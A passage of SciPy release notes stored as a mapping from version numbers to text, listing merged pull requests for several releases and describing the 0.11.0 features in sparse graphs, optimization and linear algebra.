.sav files\n- `5803 <https://github.com/scipy/scipy/pull/5803>`__: DOC: fix module name in error message\n- `5804 <https://github.com/scipy/scipy/pull/5804>`__: DOC: special: Expanded docs for special functions.\n- `5805 <https://github.com/scipy/scipy/pull/5805>`__: DOC: Fix order of returns in _spectral_helper\n- `5806 <https://github.com/scipy/scipy/pull/5806>`__: ENH: sparse: vectorized coo_matrix.diagonal\n- `5808 <https://github.com/scipy/scipy/pull/5808>`__: ENH: Added iqr function to compute IQR metric in scipy/stats/stats.py\n- `5810 <https://github.com/scipy/scipy/pull/5810>`__: MAINT/BENCH: sparse: Benchmark cleanup and additions\n- `5811 <https://github.com/scipy/scipy/pull/5811>`__: DOC: sparse.linalg: shape, not size\n- `5813 <https://github.com/scipy/scipy/pull/5813>`__: Update sparse ARPACK functions min `ncv` value\n- `5815 <https://github.com/scipy/scipy/pull/5815>`__: BUG: Error message contained wrong values\n- `5816 <https://github.com/scipy/scipy/pull/5816>`__: remove dead code from stats tests\n- `5820 <https://github.com/scipy/scipy/pull/5820>`__: \"in\"->\"a\" in order_filter docstring\n- `5821 <https://github.com/scipy/scipy/pull/5821>`__: DOC: README: INSTALL.txt was renamed in 2014\n- `5825 <https://github.com/scipy/scipy/pull/5825>`__: DOC: typo in the docstring of least_squares\n- `5826 <https://github.com/scipy/scipy/pull/5826>`__: MAINT: sparse: increase test coverage\n- `5827 <https://github.com/scipy/scipy/pull/5827>`__: NdPPoly rebase\n- `5828 <https://github.com/scipy/scipy/pull/5828>`__: Improve numerical stability of hyp0f1 for large orders\n- `5829 <https://github.com/scipy/scipy/pull/5829>`__: ENH: sparse: Add copy parameter to all .toXXX() methods in sparse...\n- `5830 <https://github.com/scipy/scipy/pull/5830>`__: DOC: rework INSTALL.rst.txt\n- `5831 <https://github.com/scipy/scipy/pull/5831>`__: Adds plotting options to voronoi_plot_2d\n- `5834 <https://github.com/scipy/scipy/pull/5834>`__: Update stats.binom_test() docstring\n- `5836 <https://github.com/scipy/scipy/pull/5836>`__: ENH, TST: Allow SIMO tf's for tf2ss\n- `5837 <https://github.com/scipy/scipy/pull/5837>`__: DOC: Image examples\n- `5838 <https://github.com/scipy/scipy/pull/5838>`__: ENH: sparse: add eliminate_zeros() to coo_matrix\n- `5839 <https://github.com/scipy/scipy/pull/5839>`__: BUG: Fixed name of NumpyVersion.__repr__\n- `5845 <https://github.com/scipy/scipy/pull/5845>`__: MAINT: Fixed typos in documentation\n- `5847 <https://github.com/scipy/scipy/pull/5847>`__: Fix bugs in sparsetools\n- `5848 <https://github.com/scipy/scipy/pull/5848>`__: BUG: sparse.linalg: add locks to ensure ARPACK threadsafety\n- `5849 <https://github.com/scipy/scipy/pull/5849>`__: ENH: sparse.linalg: upgrade to superlu 5.1.1\n- `5851 <https://github.com/scipy/scipy/pull/5851>`__: ENH: expose lapack's ilaver to python to allow lapack verion...\n- `5852 <https://github.com/scipy/scipy/pull/5852>`__: MAINT: runtests.py: ensure Ctrl-C interrupts the build\n- `5854 <https://github.com/scipy/scipy/pull/5854>`__: DOC: Minor update to documentation\n- `5855 <https://github.com/scipy/scipy/pull/5855>`__: Pr 5640\n- `5859 <https://github.com/scipy/scipy/pull/5859>`__: ENH: Add random correlation matrix generator\n- `5862 <https://github.com/scipy/scipy/pull/5862>`__: BUG: Allow expm for complex matrix with shape (1, 1)\n- `5863 <https://github.com/scipy/scipy/pull/5863>`__: FIX: Fix test\n- `5864 <https://github.com/scipy/scipy/pull/5864>`__: DOC: add a little note about the Normal survival function (Q-function)\n- `5867 <https://github.com/scipy/scipy/pull/5867>`__: Fix for #5865\n- `5869 <https://github.com/scipy/scipy/pull/5869>`__: extend normal distribution cdf to complex domain\n- `5872 <https://github.com/scipy/scipy/pull/5872>`__: DOC: Note that morlet and cwt don't work together\n- `5875 <https://github.com/scipy/scipy/pull/5875>`__: DOC: interp2d class description\n- `5876 <https://github.com/scipy/scipy/pull/5876>`__: MAINT: spatial: remove a stray print statement\n- `5878 <https://github.com/scipy/scipy/pull/5878>`__: MAINT: Fixed noisy UserWarnings in ndimage tests. Fixes #5877\n- `5879 <https://github.com/scipy/scipy/pull/5879>`__: MAINT: sparse.linalg/superlu: add explicit casts to resolve compiler...\n- `5880 <https://github.com/scipy/scipy/pull/5880>`__: MAINT: signal: import gcd from math and not fractions when on...\n- `5887 <https://github.com/scipy/scipy/pull/5887>`__: Neldermead initial simplex\n- `5894 <https://github.com/scipy/scipy/pull/5894>`__: BUG: _CustomLinearOperator unpickalable in python3.5\n- `5895 <https://github.com/scipy/scipy/pull/5895>`__: DOC: special: slightly improve the multigammaln docstring\n- `5900 <https://github.com/scipy/scipy/pull/5900>`__: Remove duplicate assignment.\n- `5901 <https://github.com/scipy/scipy/pull/5901>`__: Update bundled ARPACK\n- `5904 <https://github.com/scipy/scipy/pull/5904>`__: ENH: Make convolve and correlate order-agnostic\n- `5905 <https://github.com/scipy/scipy/pull/5905>`__: ENH: sparse.linalg: further LGMRES cleanups\n- `5906 <https://github.com/scipy/scipy/pull/5906>`__: Enhancements and cleanup in scipy.integrate (attempt #2)\n- `5907 <https://github.com/scipy/scipy/pull/5907>`__: ENH: Change sparse `.sum` and `.mean` dtype casting to match...\n- `5909 <https://github.com/scipy/scipy/pull/5909>`__: changes for convolution symmetry\n- `5913 <https://github.com/scipy/scipy/pull/5913>`__: MAINT: basinhopping remove instance test closes #5440\n- `5919 <https://github.com/scipy/scipy/pull/5919>`__: MAINT: uninitialised var if basinhopping niter=0. closes #5915\n- `5920 <https://github.com/scipy/scipy/pull/5920>`__: BLD: Fix missing lsame.c error for MKL\n- `5921 <https://github.com/scipy/scipy/pull/5921>`__: DOC: interpolate: add example showing how to work around issue...\n- `5926 <https://github.com/scipy/scipy/pull/5926>`__: MAINT: spatial: upgrade to Qhull 2015.2\n- `5928 <https://github.com/scipy/scipy/pull/5928>`__: MAINT: sparse: optimize DIA sum/diagonal, csgraph.laplacian\n- `5929 <https://github.com/scipy/scipy/pull/5929>`__: Update info/URL for octave-maintainers discussion\n- `5930 <https://github.com/scipy/scipy/pull/5930>`__: TST: special: silence DeprecationWarnings from sph_yn\n- `5931 <https://github.com/scipy/scipy/pull/5931>`__: ENH: implement the principle branch of the logarithm of Gamma.\n- `5934 <https://github.com/scipy/scipy/pull/5934>`__: Typo: \"mush\" => \"must\"\n- `5935 <https://github.com/scipy/scipy/pull/5935>`__: BUG:string comparison stats._binned_statistic closes #5927\n- `5938 <https://github.com/scipy/scipy/pull/5938>`__: Cythonize stats.ks_2samp for a ~33% gain in speed.\n- `5939 <https://github.com/scipy/scipy/pull/5939>`__: DOC: fix optimize.fmin convergence docstring\n- `5941 <https://github.com/scipy/scipy/pull/5941>`__: Fix minor typo in squareform docstring\n- `5942 <https://github.com/scipy/scipy/pull/5942>`__: Update linregress stderr description.\n- `5943 <https://github.com/scipy/scipy/pull/5943>`__: ENH: Improve numerical accuracy of lognorm\n- `5944 <https://github.com/scipy/scipy/pull/5944>`__: Merge vonmises into stats pyx\n- `5945 <https://github.com/scipy/scipy/pull/5945>`__: MAINT: interpolate: Tweak declaration to avoid cython warning...\n- `5946 <https://github.com/scipy/scipy/pull/5946>`__: MAINT: sparse: clean up format conversion methods\n- `5949 <https://github.com/scipy/scipy/pull/5949>`__: BUG: fix sparse .mean to return a scalar instead of a matrix\n- `5955 <https://github.com/scipy/scipy/pull/5955>`__: MAINT: Replace calls to `hanning` with `hann`\n- `5956 <https://github.com/scipy/scipy/pull/5956>`__: DOC: Missing periods interfering with parsing\n- `5958 <https://github.com/scipy/scipy/pull/5958>`__: MAINT: add a test for lognorm.sf underflow\n- `5961 <https://github.com/scipy/scipy/pull/5961>`__: MAINT _centered(): rename size to shape\n- `5962 <https://github.com/scipy/scipy/pull/5962>`__: ENH: constants: Add multi-scale temperature conversion function\n- `5965 <https://github.com/scipy/scipy/pull/5965>`__: ENH: special: faster way for calculating comb() for exact=True\n- `5975 <https://github.com/scipy/scipy/pull/5975>`__: ENH: Improve FIR path of signal.decimate\n- `5977 <https://github.com/scipy/scipy/pull/5977>`__: MAINT/BUG: sparse: remove overzealous bmat checks\n- `5978 <https://github.com/scipy/scipy/pull/5978>`__: minimize_neldermead() stop at user requested maxiter or maxfev\n- `5983 <https://github.com/scipy/scipy/pull/5983>`__: ENH: make sparse `sum` cast dtypes like NumPy `sum` for 32-bit...\n- `5985 <https://github.com/scipy/scipy/pull/5985>`__: BUG, API: Add `jac` parameter to curve_fit\n- `5989 <https://github.com/scipy/scipy/pull/5989>`__: ENH: Add firls least-squares fitting\n- `5990 <https://github.com/scipy/scipy/pull/5990>`__: BUG: read tries to handle 20-bit WAV files but shouldn't\n- `5991 <https://github.com/scipy/scipy/pull/5991>`__: DOC: Cleanup wav read/write docs and add tables for common types\n- `5994 <https://github.com/scipy/scipy/pull/5994>`__: ENH: Add gesvd method for svd\n- `5996 <https://github.com/scipy/scipy/pull/5996>`__: MAINT: Wave cleanup\n- `5997 <https://github.com/scipy/scipy/pull/5997>`__: TST: Break up upfirdn tests & compare to lfilter\n- `6001 <https://github.com/scipy/scipy/pull/6001>`__: Filter design docs\n- `6002 <https://github.com/scipy/scipy/pull/6002>`__: COMPAT: Expand compatibility fromnumeric.py\n- `6007 <https://github.com/scipy/scipy/pull/6007>`__: ENH: Skip conversion of TF to TF in freqresp\n- `6009 <https://github.com/scipy/scipy/pull/6009>`__: DOC: fix incorrect versionadded for entr, rel_entr, kl_div\n- `6013 <https://github.com/scipy/scipy/pull/6013>`__: Fixed the entropy calculation of the von Mises distribution.\n- `6014 <https://github.com/scipy/scipy/pull/6014>`__: MAINT: make gamma, rgamma use loggamma for complex arguments\n- `6020 <https://github.com/scipy/scipy/pull/6020>`__: WIP: ENH: add exact=True factorial for vectors\n- `6022 <https://github.com/scipy/scipy/pull/6022>`__: Added 'lanczos' to the image interpolation function list.\n- `6024 <https://github.com/scipy/scipy/pull/6024>`__: BUG: optimize: do not use dummy constraints in SLSQP when no...\n- `6025 <https://github.com/scipy/scipy/pull/6025>`__: ENH: Boundary value problem solver for ODE systems\n- `6029 <https://github.com/scipy/scipy/pull/6029>`__: MAINT: Future imports for optimize._lsq\n- `6030 <https://github.com/scipy/scipy/pull/6030>`__: ENH: stats.trap - adding trapezoidal distribution closes #6028\n- `6031 <https://github.com/scipy/scipy/pull/6031>`__: MAINT: Some improvements to optimize._numdiff\n- `6032 <https://github.com/scipy/scipy/pull/6032>`__: MAINT: Add special/_comb.c to .gitignore\n- `6033 <https://github.com/scipy/scipy/pull/6033>`__: BUG: check the requested approximation rank in interpolative.svd\n- `6034 <https://github.com/scipy/scipy/pull/6034>`__: DOC: Doc for mannwhitneyu in stats.py corrected\n- `6040 <https://github.com/scipy/scipy/pull/6040>`__: FIX: Edit the wrong link in f_oneway\n- `6044 <https://github.com/scipy/scipy/pull/6044>`__: BUG: (ordqz) always increase parameter lwork by 1.\n- `6047 <https://github.com/scipy/scipy/pull/6047>`__: ENH: extend special.spence to complex arguments.\n- `6049 <https://github.com/scipy/scipy/pull/6049>`__: DOC: Add documentation of PR #5640 to the 0.18.0 release notes\n- `6050 <https://github.com/scipy/scipy/pull/6050>`__: MAINT: small cleanups related to loggamma\n- `6070 <https://github.com/scipy/scipy/pull/6070>`__: Add asarray to explicitly cast list to numpy array in wilcoxon...\n- `6071 <https://github.com/scipy/scipy/pull/6071>`__: DOC: antialiasing filter and link decimate resample, etc.\n- `6075 <https://github.com/scipy/scipy/pull/6075>`__: MAINT: reimplement special.digamma for complex arguments\n- `6080 <https://github.com/scipy/scipy/pull/6080>`__: avoid multiple computation in kstest\n- `6081 <https://github.com/scipy/scipy/pull/6081>`__: Clarified pearson correlation return value\n- `6085 <https://github.com/scipy/scipy/pull/6085>`__: ENH: allow long indices of sparse matrix with umfpack in spsolve()\n- `6086 <https://github.com/scipy/scipy/pull/6086>`__: fix description for associated Laguerre polynomials\n- `6087 <https://github.com/scipy/scipy/pull/6087>`__: Corrected docstring of splrep.\n- `6094 <https://github.com/scipy/scipy/pull/6094>`__: ENH: special: change zeta signature to zeta(x, q=1)\n- `6095 <https://github.com/scipy/scipy/pull/6095>`__: BUG: fix integer overflow in special.spence\n- `6106 <https://github.com/scipy/scipy/pull/6106>`__: Fixed Issue #6105\n- `6116 <https://github.com/scipy/scipy/pull/6116>`__: BUG: matrix logarithm edge case\n- `6119 <https://github.com/scipy/scipy/pull/6119>`__: TST: DeprecationWarnings in stats on python 3.5 closes #5885\n- `6120 <https://github.com/scipy/scipy/pull/6120>`__: MAINT: sparse: clean up sputils.isintlike\n- `6122 <https://github.com/scipy/scipy/pull/6122>`__: DOC: optimize: linprog docs should say minimize instead of maximize\n- `6123 <https://github.com/scipy/scipy/pull/6123>`__: DOC: optimize: document the `fun` field in `scipy.optimize.OptimizeResult`\n- `6124 <https://github.com/scipy/scipy/pull/6124>`__: Move FFT zero-padding calculation from signaltools to fftpack\n- `6125 <https://github.com/scipy/scipy/pull/6125>`__: MAINT: improve special.gammainc in the ``a ~ x`` regime.\n- `6130 <https://github.com/scipy/scipy/pull/6130>`__: BUG: sparse: Fix COO dot with zero columns\n- `6138 <https://github.com/scipy/scipy/pull/6138>`__: ENH: stats: Improve behavior of genextreme.sf and genextreme.isf\n- `6146 <https://github.com/scipy/scipy/pull/6146>`__: MAINT: simplify the expit implementation\n- `6151 <https://github.com/scipy/scipy/pull/6151>`__: MAINT: special: make generate_ufuncs.py output deterministic\n- `6152 <https://github.com/scipy/scipy/pull/6152>`__: TST: special: better test for gammainc at large arguments\n- `6153 <https://github.com/scipy/scipy/pull/6153>`__: ENH: Make next_fast_len public and faster\n- `6154 <https://github.com/scipy/scipy/pull/6154>`__: fix typo \"mush\"-->\"must\"\n- `6155 <https://github.com/scipy/scipy/pull/6155>`__: DOC: Fix some incorrect RST definition lists\n- `6160 <https://github.com/scipy/scipy/pull/6160>`__: make logsumexp error out on a masked array\n- `6161 <https://github.com/scipy/scipy/pull/6161>`__: added missing bracket to rosen documentation\n- `6163 <https://github.com/scipy/scipy/pull/6163>`__: ENH: Added \"kappa4\" and \"kappa3\" distributions.\n- `6164 <https://github.com/scipy/scipy/pull/6164>`__: DOC: Minor clean-up in integrate._bvp\n- `6169 <https://github.com/scipy/scipy/pull/6169>`__: Fix mpf_assert_allclose to handle iterable results, such as maps\n- `6170 <https://github.com/scipy/scipy/pull/6170>`__: Fix pchip_interpolate convenience function\n- `6172 <https://github.com/scipy/scipy/pull/6172>`__: Corrected misplaced bracket in doc string\n- `6175 <https://github.com/scipy/scipy/pull/6175>`__: ENH: sparse.csgraph: Pass indices to shortest_path\n- `6178 <https://github.com/scipy/scipy/pull/6178>`__: TST: increase test coverage of sf and isf of a generalized extreme...\n- `6179 <https://github.com/scipy/scipy/pull/6179>`__: TST: avoid a deprecation warning from numpy\n- `6181 <https://github.com/scipy/scipy/pull/6181>`__: ENH: Boundary conditions for CubicSpline\n- `6182 <https://github.com/scipy/scipy/pull/6182>`__: DOC: Add examples/graphs to max_len_seq\n- `6183 <https://github.com/scipy/scipy/pull/6183>`__: BLD: update Bento build config files for recent changes.\n- `6184 <https://github.com/scipy/scipy/pull/6184>`__: BUG: fix issue in io/wavfile for float96 input.\n- `6186 <https://github.com/scipy/scipy/pull/6186>`__: ENH: Periodic extrapolation for PPoly and BPoly\n- `6192 <https://github.com/scipy/scipy/pull/6192>`__: MRG: Add circle-CI\n- `6193 <https://github.com/scipy/scipy/pull/6193>`__: ENH: sparse: avoid setitem densification\n- `6196 <https://github.com/scipy/scipy/pull/6196>`__: Fixed missing sqrt in docstring of Mahalanobis distance in cdist,...\n- `6206 <https://github.com/scipy/scipy/pull/6206>`__: MAINT: Minor changes in solve_bvp\n- `6207 <https://github.com/scipy/scipy/pull/6207>`__: BUG: linalg: for BLAS, downcast complex256 to complex128, not...\n- `6209 <https://github.com/scipy/scipy/pull/6209>`__: BUG: io.matlab: avoid buffer overflows in read_element_into\n- `6210 <https://github.com/scipy/scipy/pull/6210>`__: BLD: use setuptools when building.\n- `6214 <https://github.com/scipy/scipy/pull/6214>`__: BUG: sparse.linalg: fix bug in LGMRES breakdown handling\n- `6215 <https://github.com/scipy/scipy/pull/6215>`__: MAINT: special: make loggamma use zdiv\n- `6220 <https://github.com/scipy/scipy/pull/6220>`__: DOC: Add parameter\n- `6221 <https://github.com/scipy/scipy/pull/6221>`__: ENH: Improve Newton solver for solve_bvp\n- `6223 <https://github.com/scipy/scipy/pull/6223>`__: pchip should work for length-2 arrays\n- `6224 <https://github.com/scipy/scipy/pull/6224>`__: signal.lti: deprecate cross-class properties/setters\n- `6229 <https://github.com/scipy/scipy/pull/6229>`__: BUG: optimize: avoid an infinite loop in Newton-CG\n- `6230 <https://github.com/scipy/scipy/pull/6230>`__: Add example for application of gaussian filter\n- `6236 <https://github.com/scipy/scipy/pull/6236>`__: MAINT: gumbel_l accuracy\n- `6237 <https://github.com/scipy/scipy/pull/6237>`__: MAINT: rayleigh accuracy\n- `6238 <https://github.com/scipy/scipy/pull/6238>`__: MAINT: logistic accuracy\n- `6239 <https://github.com/scipy/scipy/pull/6239>`__: MAINT: bradford distribution accuracy\n- `6240 <https://github.com/scipy/scipy/pull/6240>`__: MAINT: avoid bad fmin in l-bfgs-b due to maxfun interruption\n- `6241 <https://github.com/scipy/scipy/pull/6241>`__: MAINT: weibull_min accuracy\n- `6246 <https://github.com/scipy/scipy/pull/6246>`__: ENH: Add _support_mask to distributions\n- `6247 <https://github.com/scipy/scipy/pull/6247>`__: fixed a print error for an example of ode\n- `6249 <https://github.com/scipy/scipy/pull/6249>`__: MAINT: change x-axis label for stats.probplot to \"theoretical...\n- `6250 <https://github.com/scipy/scipy/pull/6250>`__: DOC: fix typos\n- `6251 <https://github.com/scipy/scipy/pull/6251>`__: MAINT: constants: filter out test noise from deprecated conversions\n- `6252 <https://github.com/scipy/scipy/pull/6252>`__: MAINT: io/arff: remove unused variable\n- `6253 <https://github.com/scipy/scipy/pull/6253>`__: Add examples to scipy.ndimage.filters\n- `6254 <https://github.com/scipy/scipy/pull/6254>`__: MAINT: special: fix some build warnings\n- `6258 <https://github.com/scipy/scipy/pull/6258>`__: MAINT: inverse gamma distribution accuracy\n- `6260 <https://github.com/scipy/scipy/pull/6260>`__: MAINT: signal.decimate - Use discrete-time objects\n- `6262 <https://github.com/scipy/scipy/pull/6262>`__: BUG: odr: fix string formatting\n- `6267 <https://github.com/scipy/scipy/pull/6267>`__: TST: fix some test issues in interpolate and stats.\n- `6269 <https://github.com/scipy/scipy/pull/6269>`__: TST: fix some warnings in the test suite\n- `6274 <https://github.com/scipy/scipy/pull/6274>`__: ENH: Add sosfiltfilt\n- `6276 <https://github.com/scipy/scipy/pull/6276>`__: DOC: update release notes for 0.18.0\n- `6277 <https://github.com/scipy/scipy/pull/6277>`__: MAINT: update the author name mapping\n- `6282 <https://github.com/scipy/scipy/pull/6282>`__: DOC: Correcting references for scipy.stats.normaltest\n- `6283 <https://github.com/scipy/scipy/pull/6283>`__: DOC: some more additions to 0.18.0 release notes.\n- `6284 <https://github.com/scipy/scipy/pull/6284>`__: Add `.. versionadded::` directive to `loggamma`.\n- `6285 <https://github.com/scipy/scipy/pull/6285>`__: BUG: stats: Inconsistency in the multivariate_normal docstring...\n- `6290 <https://github.com/scipy/scipy/pull/6290>`__: Add author list, gh-lists to 0.18.0 release notes\n- `6293 <https://github.com/scipy/scipy/pull/6293>`__: TST: special: relax a test's precision\n- `6295 <https://github.com/scipy/scipy/pull/6295>`__: BUG: sparse: stop comparing None and int in bsr_matrix constructor\n- `6313 <https://github.com/scipy/scipy/pull/6313>`__: MAINT: Fix for python 3.5 travis-ci build problem.\n- `6327 <https://github.com/scipy/scipy/pull/6327>`__: TST: signal: use assert_allclose for testing near-equality in...\n- `6330 <https://github.com/scipy/scipy/pull/6330>`__: BUG: spatial/qhull: allocate qhT via malloc to ensure CRT likes...\n- `6332 <https://github.com/scipy/scipy/pull/6332>`__: TST: fix stats.iqr test to not emit warnings, and fix line lengths.\n- `6334 <https://github.com/scipy/scipy/pull/6334>`__: MAINT: special: fix a test for hyp0f1\n- `6347 <https://github.com/scipy/scipy/pull/6347>`__: TST: spatial.qhull: skip a test on 32-bit platforms\n- `6350 <https://github.com/scipy/scipy/pull/6350>`__: BUG: optimize/slsqp: don't overwrite an array out of bounds\n- `6351 <https://github.com/scipy/scipy/pull/6351>`__: BUG: #6318 Interp1d 'nearest' integer x-axis overflow issue fixed\n- `6355 <https://github.com/scipy/scipy/pull/6355>`__: Backports for 0.18.0\n\n\n\n=========================\n", "0.7.2": "only change is that all C sources from Cython code have been regenerated with\n", "0.7.1": "and NumPy 1.4. \n\n\n==========================\n", "1.9.1": "-----------------------\n\n* `16709 <https://github.com/scipy/scipy/pull/16709>`__: BLD: make the way we count commits for version numbering more...\n* `16736 <https://github.com/scipy/scipy/pull/16736>`__: REL: prep for SciPy 1.9.1\n* `16749 <https://github.com/scipy/scipy/pull/16749>`__: BLD: install missing \\`.pxd\\` files, and update TODOs/FIXMEs...\n* `16750 <https://github.com/scipy/scipy/pull/16750>`__: BLD: make OpenBLAS detection work with CMake\n* `16755 <https://github.com/scipy/scipy/pull/16755>`__: TST: sparse.linalg: Loosen tolerance for the lobpcg test 'test_tolerance_float32'\n* `16760 <https://github.com/scipy/scipy/pull/16760>`__: BLD: use a bit more idiomatic approach to constructing paths...\n* `16768 <https://github.com/scipy/scipy/pull/16768>`__: DOC: stats.skew/kurtosis: returns NaN when input has only one...\n* `16794 <https://github.com/scipy/scipy/pull/16794>`__: BLD/REL: on Windows use numpy 1.22.3 as the version to build...\n* `16822 <https://github.com/scipy/scipy/pull/16822>`__: BUG/TST: linalg: Check the results of 'schur' more carefully.\n* `16825 <https://github.com/scipy/scipy/pull/16825>`__: BUG: interpolate: fix \"previous\" and \"next\" extrapolate logic...\n* `16862 <https://github.com/scipy/scipy/pull/16862>`__: BUG, DOC: Fix sphinx autosummary generation for \\`odr\\` and \\`czt\\`\n* `16881 <https://github.com/scipy/scipy/pull/16881>`__: MAINT: optimize.milp: fix input validation when three constraints...\n* `16901 <https://github.com/scipy/scipy/pull/16901>`__: MAINT: 1.9.1 backports\n* `16904 <https://github.com/scipy/scipy/pull/16904>`__: BLD: update dependency ranges for meson-python and pybind11 for...\n\n\n==========================\n", "0.18.1": "------------------------\n\n- `6405 <https://github.com/scipy/scipy/pull/6405>`__: BUG: sparse: fix elementwise divide for CSR/CSC\n- `6431 <https://github.com/scipy/scipy/pull/6431>`__: BUG: result for insufficient neighbours from cKDTree is wrong.\n- `6432 <https://github.com/scipy/scipy/pull/6432>`__: BUG Issue #6421: scipy.linalg.solve_banded overwrites input 'b'...\n- `6455 <https://github.com/scipy/scipy/pull/6455>`__: DOC: add links to release notes\n- `6462 <https://github.com/scipy/scipy/pull/6462>`__: BUG: interpolate: fix .roots method of PchipInterpolator\n- `6492 <https://github.com/scipy/scipy/pull/6492>`__: BUG: Fix regression in dblquad: #6458\n- `6543 <https://github.com/scipy/scipy/pull/6543>`__: fix the regression in circmean\n- `6545 <https://github.com/scipy/scipy/pull/6545>`__: Revert gh-5938, restore ks_2samp\n- `6557 <https://github.com/scipy/scipy/pull/6557>`__: Backports for 0.18.1\n\n\n\n==========================\n", "1.5.3": "-----------------------\n\n* `12611 <https://github.com/scipy/scipy/pull/12611>`__: MAINT: prepare for SciPy 1.5.3\n* `12614 <https://github.com/scipy/scipy/pull/12614>`__: MAINT: prevent reverse broadcasting\n* `12617 <https://github.com/scipy/scipy/pull/12617>`__: MAINT: optimize: Handle nonscalar size 1 arrays in fmin_slsqp...\n* `12623 <https://github.com/scipy/scipy/pull/12623>`__: MAINT: stats: Loosen some test tolerances.\n* `12638 <https://github.com/scipy/scipy/pull/12638>`__: CI, MAINT: pin pytest for Azure win\n* `12668 <https://github.com/scipy/scipy/pull/12668>`__: BUG: Ensure factorial is not too large in mstats.kendalltau\n* `12705 <https://github.com/scipy/scipy/pull/12705>`__: MAINT: \\`openblas_support\\` added sha256 hash\n* `12706 <https://github.com/scipy/scipy/pull/12706>`__: BUG: fix incorrect 1d case of the fourier_ellipsoid filter\n* `12721 <https://github.com/scipy/scipy/pull/12721>`__: BUG: use special.sindg in ndimage.rotate\n* `12724 <https://github.com/scipy/scipy/pull/12724>`__: BUG: per #12654 adjusted mudholkar_george method to combine p...\n* `12726 <https://github.com/scipy/scipy/pull/12726>`__: BUG: Fix DOP853 error norm for complex problems\n* `12730 <https://github.com/scipy/scipy/pull/12730>`__: CI: pin xdist for Azure windows\n* `12786 <https://github.com/scipy/scipy/pull/12786>`__: BUG: stats: Fix formula in the \\`stats\\` method of the ARGUS...\n* `12795 <https://github.com/scipy/scipy/pull/12795>`__: CI: Pin setuptools on windows CI\n* `12830 <https://github.com/scipy/scipy/pull/12830>`__: [BUG] sparse: Avoid using size attribute in LIL __setitem__\n* `12833 <https://github.com/scipy/scipy/pull/12833>`__: BUG: change list of globals items to list of a copy\n* `12842 <https://github.com/scipy/scipy/pull/12842>`__: BUG: Use uint16 for cost in NI_WatershedElement\n* `12845 <https://github.com/scipy/scipy/pull/12845>`__: BUG: avoid boolean or integer addition error in ndimage.measurements.median\n* `12864 <https://github.com/scipy/scipy/pull/12864>`__: BLD: replace the #include of libqull_r.h with with this of qhull_ra.h...\n* `12867 <https://github.com/scipy/scipy/pull/12867>`__: BUG: Fixes a ValueError yielded upon calling Scipy Interpolator...\n* `12902 <https://github.com/scipy/scipy/pull/12902>`__: CI: Remove 'env' from pytest.ini\n* `12913 <https://github.com/scipy/scipy/pull/12913>`__: MAINT: Ignore pytest's PytestConfigWarning\n\n\n\n==========================\n", "0.12.1": "==========================\n\nSciPy 0.12.1 is a bug-fix release with no new features compared to 0.12.0.\nThe single issue fixed by this release is a security issue in ``scipy.weave``,\nwhich was previously using temporary directories in an insecure manner under \ncertain circumstances.\n\n\n==========================\n", "0.11.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  Highlights of this release are:\n\n  - A new module has been added which provides a number of common sparse graph\n    algorithms.\n  - New unified interfaces to the existing optimization and root finding\n    functions have been added.\n\nAll users are encouraged to upgrade to this release, as there are a large\nnumber of bug-fixes and optimizations.  Our development attention will now\nshift to bug-fix releases on the 0.11.x branch, and on adding new features on\nthe master branch.\n\nThis release requires Python 2.4-2.7 or 3.1-3.2 and NumPy 1.5.1 or greater.\n\n\nNew features\n============\n\n.. currentmodule:: scipy.sparse.csgraph\n\nSparse Graph Submodule\n----------------------\nThe new submodule :mod:`scipy.sparse.csgraph` implements a number of efficient\ngraph algorithms for graphs stored as sparse adjacency matrices.  Available\nroutines are:\n\n   - :func:`connected_components` - determine connected components of a graph\n   - :func:`laplacian` - compute the laplacian of a graph\n   - :func:`shortest_path` - compute the shortest path between points on a\n     positive graph\n   - :func:`dijkstra` - use Dijkstra's algorithm for shortest path\n   - :func:`floyd_warshall` - use the Floyd-Warshall algorithm for\n     shortest path\n   - :func:`breadth_first_order` - compute a breadth-first order of nodes\n   - :func:`depth_first_order` - compute a depth-first order of nodes\n   - :func:`breadth_first_tree` - construct the breadth-first tree from\n     a given node\n   - :func:`depth_first_tree` - construct a depth-first tree from a given node\n   - :func:`minimum_spanning_tree` - construct the minimum spanning\n     tree of a graph\n\n\n``scipy.optimize`` improvements\n-------------------------------\n\nThe optimize module has received a lot of attention this release.  In addition\nto added tests, documentation improvements, bug fixes and code clean-up, the\nfollowing improvements were made:\n\n- A unified interface to minimizers of univariate and multivariate\n  functions has been added.\n- A unified interface to root finding algorithms for multivariate functions\n  has been added.\n- The L-BFGS-B algorithm has been updated to version 3.0.\n\n\nUnified interfaces to minimizers\n````````````````````````````````\n\n.. currentmodule:: scipy.optimize\n\nTwo new functions ``scipy.optimize.minimize`` and\n``scipy.optimize.minimize_scalar`` were added to provide a common interface\nto minimizers of multivariate and univariate functions respectively.\nFor multivariate functions, ``scipy.optimize.minimize`` provides an\ninterface to methods for unconstrained optimization (`fmin`, `fmin_powell`,\n`fmin_cg`, `fmin_ncg`, `fmin_bfgs` and `anneal`) or constrained\noptimization (`fmin_l_bfgs_b`, `fmin_tnc`, `fmin_cobyla` and `fmin_slsqp`).\nFor univariate functions, ``scipy.optimize.minimize_scalar`` provides an\ninterface to methods for unconstrained and bounded optimization (`brent`,\n`golden`, `fminbound`).\nThis allows for easier comparing and switching between solvers.\n\nUnified interface to root finding algorithms\n````````````````````````````````````````````\n\nThe new function ``scipy.optimize.root`` provides a common interface to\nroot finding algorithms for multivariate functions, embedding `fsolve`,\n`leastsq` and ``nonlin`` solvers.\n\n\n``scipy.linalg`` improvements\n-----------------------------\n\nNew matrix equation solvers\n```````````````````````````\n\nSolvers for the Sylvester equation (``scipy.linalg.solve_sylvester``, discrete\nand continuous Lyapunov equations (``scipy.linalg.solve_lyapunov``,\n``scipy.linalg.solve_discrete_lyapunov``) and discrete and continuous algebraic\nRiccati equations (``scipy.linalg.solve_continuous_are``,\n``scipy.linalg.solve_discrete_are``) have been added to ``scipy.linalg``.\nThese solvers are often used in the field of linear control theory.\n\nQZ and QR Decomposition\n````````````````````````\n\nIt is now possible to calculate the QZ, or Generalized Schur, decomposition\nusing ``scipy.linalg.qz``. This function wraps the LAPACK routines sgges,\ndgges, cgges, and zgges.\n\nThe function ``scipy.linalg.qr_multiply``, which allows efficient computation\nof the matrix product of Q (from a QR decomposition) and a vector, has been\nadded.\n\nPascal matrices\n```````````````\n\nA function for creating Pascal matrices, ``scipy.linalg.pascal``, was added.\n\n\nSparse matrix construction and operations\n-----------------------------------------\n\nTwo new functions, ``scipy.sparse.diags`` and ``scipy.sparse.block_diag``, were\nadded to easily construct diagonal and block-diagonal sparse 